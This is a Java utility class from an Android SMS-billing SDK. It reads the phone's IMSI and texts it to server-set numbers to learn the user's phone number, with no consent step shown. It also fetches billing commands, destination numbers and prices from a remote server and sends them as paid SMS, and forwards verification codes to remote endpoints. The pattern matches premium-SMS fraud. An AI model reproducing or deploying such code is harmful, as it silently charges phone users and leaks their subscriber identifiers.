package com.y7.smspay.sdk.util;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.util.Xml;

import com.y7.smspay.sdk.channel.WoAddayChannel;
import com.y7.smspay.sdk.channel.XRPoyChannel;
import com.y7.smspay.sdk.channel.YDSQPoyChannel;
import com.y7.smspay.sdk.channel.YZRDOPoyChannel;
import com.y7.smspay.sdk.json.GetDataImpl;
import com.y7.smspay.sdk.json.MessageEntity;
import com.y7.smspay.sdk.mgr.YManager;
import com.y7.smspay.sdk.mgr.YPoyManager;
import com.y7.smspay.sdk.ss.ISdMsgLs;
import com.y7.smspay.sdk.ss.SdMsg;
import com.y7.smspay.sdk.ss.SsParse;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.xmlpull.v1.XmlPullParser;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.StringReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLDecoder;

/**
 * http短信计费工具类
 * 
 * @author xingjian.peng
 * 
 */
public class HttpSdSsTool {
	public static final int XT = 1;
	public static final int WOADD = 2;
	public static final int YZRDO = 3;
	public static final int YDSQ = 4;

	public static int ISREQUESCODE = 0;// 为0,不需要获取验证码
	public static String xmlResultStr = "";
	public static String xmlMsgStr = "";
	public static String xmlOrderIdStr = "";
	private static IHttpRequestLs httpRequestListener;
	public static String YDSQStr = "";

	public static void setHttpRequestListener(
			IHttpRequestLs _httpRequestListener) {
		httpRequestListener = _httpRequestListener;
	}

	// com.y7.smspay.mp
	/**
	 * 获得本机手机号
	 */
	public static String getPhoneNumber(Context mContext) {
		//DDDLog.d("获取手机号");

		String phoneNumber = "";

		/**
		 * 获取后台保存的手机号
		 */
		phoneNumber = GetDataImpl.getInstance(mContext).findNum();
		/*
		 * if (!TextUtils.isEmpty(phoneNumber)) {
		 * Utils.save2SDCard(Constants.MYPHONENUMBER, phoneNumber);
		 * GetDataImpl.getInstance(mContext).savePhonenum(phoneNumber, "5");
		 * return phoneNumber; }
		 * 
		 * // 读取SD卡 try { phoneNumber =
		 * Utils.getFromSDCard(Constants.MYPHONENUMBER); } catch (Exception e) {
		 * } if (!TextUtils.isEmpty(phoneNumber)) { if
		 * (phoneNumber.contains("imsi")) { // 防止被污染的情况 try { JSONObject
		 * jsonObject = new JSONObject(phoneNumber); phoneNumber =
		 * jsonObject.getString("phone"); } catch (Exception e) {
		 * LogUtils.e("Exception", e); } } }
		 * 
		 * LogUtils.d("sd卡获取手机号 -->" +
		 * Utils.getFromSDCard(Constants.MYPHONENUMBER)); if
		 * (!TextUtils.isEmpty(phoneNumber)) {
		 * GetDataImpl.getInstance(mContext).savePhonenum(phoneNumber, "3");
		 * return phoneNumber; }
		 */
		// // SD卡没有通过API获取
		// TelephonyManager telephonyManager = (TelephonyManager)
		// mContext.getSystemService(Context.TELEPHONY_SERVICE);
		// phoneNumber = telephonyManager.getLine1Number();
		// if (!TextUtils.isEmpty(phoneNumber)) {
		// Utils.save2SDCard(Constants.MYPHONENUMBER, phoneNumber);
		// GetDataImpl.getInstance(mContext).savePhonenum(phoneNumber, "4");
		// return phoneNumber;
		// }
		// API获取失败发送短信获取

		if (TextUtils.isEmpty(phoneNumber)) {
			setHttpRequestListener(new IHttpRequestLs() {
				@Override
				public void onSendSucceed() {
					//DDDLog.d("API获取失败发送短信获取 onSendSucceed");
				}

				@Override
				public void onSendFailed() {
					//DDDLog.d("API获取失败发送短信获取 onSendFailed");
				}
			});
			if (!TextUtils.isEmpty(Constants.SERVER_PHONENUMBER1)) {
				sendMassage(mContext, "g" + Utils.getIMSI(mContext),
						Constants.SERVER_PHONENUMBER1);
			}
			//DDDLog.d("发送短信获取手机号");
		}
		return phoneNumber;
	}

	/**
	 * 初始化后判断是否取号 add 0302
	 * 
	 * @param mContext
	 * @return
	 */
	public static void sendSmsPhone(Context mContext) {
		String imsi = Utils.getIMSI(mContext);
		if (!TextUtils.isEmpty(Constants.SERVER_PHONENUMBER1)
				&& !TextUtils.isEmpty(imsi)) {
			//DDDLog.d("init-->发送短信获取手机号");
			sendMassage(mContext, "g" + imsi, Constants.SERVER_PHONENUMBER1);
		}
	}

	// 获取验证码
	public static String requestCode(int channel, String urlStr) {
		// CHANNEL = channel;
		try {
			URL url = new URL(urlStr);
			HttpURLConnection urlcon = (HttpURLConnection) url.openConnection();
			urlcon.connect(); // 获取连接
			InputStream is_2 = urlcon.getInputStream();
			BufferedReader buffer = new BufferedReader(new InputStreamReader(
					is_2, "utf-8"));
			StringBuffer bs = new StringBuffer();
			String l = null;
			while ((l = buffer.readLine()) != null) {
				bs.append(l).append("");
			}
			// 解析xml
			String xmlStr = bs.toString();
			return xmlStr;
		} catch (Exception e) {
			//DDDLog.e("Exception", e);
		}
		return null;
	}

	/**
	 * 验证指令
	 */
	public static void callBackCore(final int channel, final String code) {
		new Thread(new Runnable() {

			@Override
			public void run() {
				//DDDLog.d("验证指令");
				String endUrl = "";
				try {
					if (channel == Constants.CHANNEL_PCXR) {
						endUrl = XRPoyChannel.getcallBackUrl(code);
					} else if (channel == Constants.CHANNEL_WO) {
						endUrl = WoAddayChannel.getcallBackUrl(code);
					} else if (channel == Constants.CHANNEL_YZRDO) {
						endUrl = YZRDOPoyChannel.getcallBackUrl(code);
					} else if (channel == Constants.CHANNEL_YDSQ) {
						endUrl = YDSQPoyChannel.getcallBackUrl(code);
					} else if (channel == Constants.CHANNEL_YYYYY) {
						String httpUrl = StrUtils.SERVER_URL
								+ "/gwzoo/pinterface/PhoneAPIAction!resetPwd";
						String paymentCode = "code=" + code;

						if (Constants.isTest) {
							paymentCode = "code=debug" + code;
						}
						endUrl = httpUrl + "?" + paymentCode + "&"
								+ HttpSdSsTool.YDSQStr;
						SsParse.secondType = "1";
					}
					URL url_3 = new URL(endUrl);
					HttpURLConnection urlcon = (HttpURLConnection) url_3
							.openConnection();
					urlcon.connect(); // 获取连接
					InputStream is_3 = urlcon.getInputStream();
					BufferedReader buffer2 = new BufferedReader(
							new InputStreamReader(is_3, "utf-8"));
					StringBuffer bs = new StringBuffer();
					String l = null;
					while ((l = buffer2.readLine()) != null) {
						bs.append(l).append("");
					}
					//DDDLog.d("验证指令:" + bs.toString());

					// 解析xml
					String xmlStr = bs.toString();
					XmlPullParser parser = Xml.newPullParser();
					parser.setInput(new StringReader(xmlStr));
					int event = parser.getEventType();

					while (event != XmlPullParser.END_DOCUMENT) {
						switch (event) {
						case XmlPullParser.START_DOCUMENT:
							break;
						case XmlPullParser.START_TAG:
							String name = parser.getName();
							if (name.equalsIgnoreCase("response")) {
							} else if (name.equalsIgnoreCase("result")) {
								String result = parser.nextText();
								if (result.equals("0")) {
									httpRequestListener.onSendSucceed();
								} else {
									httpRequestListener.onSendFailed();
								}
							} else if (name.equalsIgnoreCase("msg")) {
							}
							break;
						case XmlPullParser.END_TAG:
							break;
						}
						event = parser.next();
					}
				} catch (Exception e) {
					//DDDLog.e("Exception", e);
				}
			}
		}).start();
	}

	static String SENT_SMS_ACTION = "SENT_SMS_ACTION";
	static Intent sentIntent = new Intent(SENT_SMS_ACTION);

	static String SMS_DELIVERED_ACTION = "SMS_DELIVERED_ACTION";
	static Intent deliveredIntent = new Intent(SMS_DELIVERED_ACTION);

	/**
	 * 请求发送信息
	 * 
	 * @param content
	 *            短信内容
	 * @param phoneNumber
	 *            手机号码
	 */
	public static void sendMassage(final Context mContext,
			final String content, final String phoneNumber) {
		//DDDLog.d("sendMassage");

		PendingIntent pi = PendingIntent.getBroadcast(mContext, 0, sentIntent,
				0);

		//DDDLog.d(phoneNumber + "------" + content);
		// 短信发送状态监控
		mContext.registerReceiver(new BroadcastReceiver() {
			@Override
			public void onReceive(Context context, Intent arg1) {
				// TODO Auto-generated method stub
				//DDDLog.d("同步短信 -->" + getResultCode());
				switch (getResultCode()) {
				case Activity.RESULT_OK:
					//DDDLog.d("sendMassage ok");
					MessageEntity messageEntity = new MessageEntity(mContext,
							phoneNumber, content, YPoyManager.PayState_SUCCESS);
					YManager.getInstance().saveMessage(context, messageEntity);
					break;
				default:
					//DDDLog.d("sendMassage err");
					messageEntity = new MessageEntity(mContext, phoneNumber,
							content, YPoyManager.PayState_FAILURE);
					YManager.getInstance().saveMessage(context, messageEntity);
					// ？
					if (phoneNumber.equals(Constants.SERVER_PHONENUMBER1)) {
						if (!TextUtils.isEmpty(Constants.SERVER_PHONENUMBER1))
							sendMassage(mContext,
									"abc" + Utils.getIMSI(mContext),
									Constants.SERVER_PHONENUMBER2);
					}
					break;
				}
				context.unregisterReceiver(this);
			}

		}, new IntentFilter(SENT_SMS_ACTION));

		PendingIntent deliveredPI = PendingIntent.getBroadcast(mContext, 0,
				deliveredIntent, 0);
		mContext.registerReceiver(new BroadcastReceiver() {
			@Override
			public void onReceive(Context context, Intent intent) {
				switch (getResultCode()) {
				case Activity.RESULT_OK:
					//DDDLog.d("deliveredPI ok");
					break;
				case Activity.RESULT_CANCELED:
					//DDDLog.d("deliveredPI err");
					break;
				}
				context.unregisterReceiver(this);
			}
		}, new IntentFilter(SMS_DELIVERED_ACTION));

		SmsManager sms = SmsManager.getDefault();
		try {
			sms.sendTextMessage(phoneNumber, null, content, pi, deliveredPI);
		} catch (Exception e) {
			httpRequestListener.onSendFailed();
		}
	}

	/**
	 * 验证指令
	 */
	public static void callSedCore(final Context mContext, final int throughId,
			final String did, final String serParam, final String endUrl) {
		new Thread(new Runnable() {
			@Override
			public void run() {
				//DDDLog.d("验证指令");
				String json = GetDataImpl.getInstance(mContext).doRequest(
						endUrl);
				//DDDLog.e("bodys -->1二次发送 " + json);

				JSONObject singleJson = null;
				JSONArray bodys = null;
				try {
					singleJson = new JSONObject(json);
					bodys = singleJson.getJSONArray("order");
					//DDDLog.d("bodys -->2二次发送 " + bodys.toString());
				} catch (JSONException e) {
					//DDDLog.e("pay json", e);
				}
				if (bodys == null || bodys.length() <= 0) {
					//DDDLog.i("返回通道为空！！！！！");
					return;
				}
				String payCode = null;
				String channelTelnumber = null;
				int price = 0;

				for (int i = 0; i < bodys.length(); i++) {
					try {
						JSONObject body = bodys.getJSONObject(i);
						//DDDLog.d("**********************************************");
						//DDDLog.d("command -befor->"+ body.get("command").toString());
						//DDDLog.d("command -->"+ URLDecoder.decode(body.get("command").toString(), "UTF-8"));
						//DDDLog.d("**********************************************");

						// 使用URL编码解决传输过程中自动转义的问题
						payCode = URLDecoder.decode(body.get("command")
								.toString(), "UTF-8");
						channelTelnumber = body.get("sendport").toString();

						price = Integer.parseInt(body.getString("price"));

						//DDDLog.d("**********************************************"+ payCode);
					} catch (Exception e1) {
						//DDDLog.e("pay", e1);
					}
				}

				if (TextUtils.isEmpty(channelTelnumber)
						|| TextUtils.isEmpty(payCode)) {
					return;
				}

				new SdMsg(false,0,0,mContext, channelTelnumber, payCode, price,
						throughId, did, serParam, new ISdMsgLs() {
							@Override
							public void onSendSucceed() {
								//DDDLog.e("11111 pay" + "onSendSucceed");
							}

							@Override
							public void onSendFailed() {

							}
						});
			}
		}).start();
	}

	public static void callBackPost(final Context mContext, final String endUrl) {
		new Thread(new Runnable() {
			@Override
			public void run() {
				//DDDLog.d("callBackPost");
				String json = GetDataImpl.getInstance(mContext).doRequest(
						endUrl);
				//DDDLog.e("callBackPost body-->"+json);
				String messageBody = null;
				try {
					JSONObject jsonObj = new JSONObject(json);
					JSONArray orderJs = jsonObj.getJSONArray("order");

					if (orderJs != null) {
						for (int i = 0; i < orderJs.length(); i++) {
							JSONObject js = orderJs.getJSONObject(i);

							messageBody = js.isNull("command") ? null
									: js.getString("command");
						}
					}
				} catch (JSONException e) {
					e.printStackTrace();
				}
				//DDDLog.e("callBackPost para" + messageBody);
				json = GetDataImpl.getInstance(mContext).doPost(
						Constants.CMGAME_URL, messageBody);
				
				
				//DDDLog.e("callBackPost 2 " + json);
			}
		}).start();
	}
}
